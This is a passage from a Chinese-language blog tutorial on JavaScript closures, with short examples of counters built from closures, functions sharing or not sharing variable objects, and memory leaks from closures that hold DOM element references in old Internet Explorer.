总结来说，前者10个函数共享同一个变量对象，这个变量对象在res返回之后才被保存使用，因此值为10，；后者10个函数分别使用不同的父级环境的变量对象，这些变量对象是随着for循环依次保存给内部闭包使用，因此内部闭包保留有不同的num副本，可以返回正确的值 更多例子：闭包，看这一篇就够了——带你看透闭包的本质，百发百中（转载，侵删）其中，个人认为这个例子能最简单地看清闭包的本质。 12345678910111213141516function m1()&#123; var x = 1; return function()&#123; console.log(++x); &#125;&#125; m1()(); //2m1()(); //2m1()(); //2//使用不同的变量对象var m2 = m1();m2(); //2m2(); //3m2(); //4//引用同一个变量对象 总结：就是认清楚到底是什么时候保存的被销毁函数的变量对象当然，还有一个小坑值得一提 123456789101112function Foo() &#123; var i = 0; return function() &#123; console.log(i++); &#125;&#125; var f1 = Foo(), f2 = Foo();f1();f1();f2(); 这段代码的输出是0，1, 0我一开始认为f1和f2都=foo()是都指向了同一个function引用类型，所以顺理成章就会答错认为：0 1 2但其实foo()返回的是一个匿名函数，所以f1,f2相当于指向了两个不同的函数对象，所以结果也就是0 1 0 闭包带来的问题：内存泄漏合理使用闭包可以很好的实现封装与缓存但是需要注意的是，闭包的特性使得其一些变量与参数不会被js的垃圾回收机制所回收，所以在老版本的IE中，如果使用闭包不当，会造成消耗内存和内存溢出的问题。举个栗子： 1234567function a()&#123; var element = document.getElementById('test') element.onclick = function()&#123; console.log(element.id) &#125;&#125;//以上函数由于保存了函数a的活动对象的引用，因此element占用的内存将永远不会被释放 这个问题可以用以下方法暂时解决 12345678function a()&#123; var element = document.getElementById('test') var id = element.id element.onclick = function()&#123; console.log(id) &#125; element = null&#125; 上述代码中，我们将element的id值保留着在一个副本中，防止闭包函数对element的直接引用，但一定要记住的是，由于闭包保存的是执行环境的整个活动对象，所以即使没有直接引用element，活动对象{element, id, …}中element依然存在，因此需要将element设置为null以回收内存，否则并不会解决内存泄漏的问题","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]}]}